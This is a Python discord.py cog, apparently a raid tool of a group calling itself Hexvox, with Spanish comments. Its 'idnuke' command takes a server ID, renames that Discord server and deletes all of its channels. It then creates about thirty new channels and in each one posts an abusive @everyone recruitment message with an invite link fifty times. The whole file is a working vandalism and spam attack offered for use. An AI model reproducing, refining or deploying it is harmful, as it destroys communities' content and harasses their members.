import discord
from discord.ext import commands
import asyncio
import os
import sys

class IDNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.URL_FOTO = "https://i.postimg.cc/0Q3dF5fX/Screenshot-20260419-094111.jpg"
        self.INVITE_LINK = "https://discord.gg/NgMaE9GMQ"

    @commands.command()
    @commands.is_owner()
    async def idnuke(self, ctx, target_id: int):
        # 1. Verificación de seguridad y protección de IDs
        if ctx.guild.id == target_id:
            return await ctx.send("❌ Error: No puedes nukear el servidor donde estás.")

        FORBIDDEN_IDS = [1501947925377319075, 1488596416694583396]
        if target_id in FORBIDDEN_IDS:
            return await ctx.send("❌ Error: No puedes nukear este servidor protegido.")

        target_guild = self.bot.get_guild(target_id)
        if not target_guild:
            return await ctx.send("❌ El bot no está en ese servidor o la ID es inválida.")

        print(f"☢️ ATACANDO POR ID: {target_guild.name}")
        await ctx.send(f"☢️ Iniciando protocolo ID-SPAM en **{target_guild.name}**...")

        # 2. Cambio de nombre del servidor (Roles y Miembros se mantienen intactos)
        try:
            await target_guild.edit(name="☢️servidor destruido☢️")
        except:
            pass

        # 3. Borrado secuencial rápido solo de canales
        for channel in target_guild.channels:
            asyncio.create_task(self.safe_delete(channel))

        # 4. Mensaje de ataque configurado (Igual al .nuke original)
        mensaje_ataque = (
            "@everyone\n"
            "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n"
            "   ☠️ **HEXVOX HAS ARRIVED** ☠️\n"
            "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n"
            "> ⚔️ **HEXVOX LOS MANDA PUTA**\n"
            "> ⛓️ **OWNED BY HEXVOX LEGION**\n"
            "```idiotas 🤣 yo los mando únete ahora a la legión Hexvox```\n"
            f"🔗 **ÚNETE:** {self.INVITE_LINK}\n"
            f"{self.URL_FOTO}"
        )

        # 5. Creación de canales y spam directo del BOT (50 mensajes por canal)
        for _ in range(6): # Grupos para evitar saturación
            tasks = [self.crear_y_bot_spam(target_guild, mensaje_ataque) for _ in range(5)]
            asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1.5)

        await ctx.send("✅ Ataque de spam finalizado. Reiniciando sistema...")
        print("SISTEMA REINICIANDO...")

        # 6. Reinicio para limpiar caché y procesos
        os.execv(sys.executable, ['python'] + sys.argv)

    async def safe_delete(self, obj):
        try:
            await obj.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    async def crear_y_bot_spam(self, guild, mensaje):
        try:
            # Los canales se llamarán destruido-por-hexvox
            channel = await guild.create_text_channel(name="destruido-por-hexvox")
            
            # El bot envía 50 mensajes directamente
            for _ in range(50):
                await channel.send(content=mensaje)
                await asyncio.sleep(0.7) # Pausa para evitar el Rate Limit del bot
        except:
            pass

async def setup(bot):
    await bot.add_cog(IDNuke(bot))
        
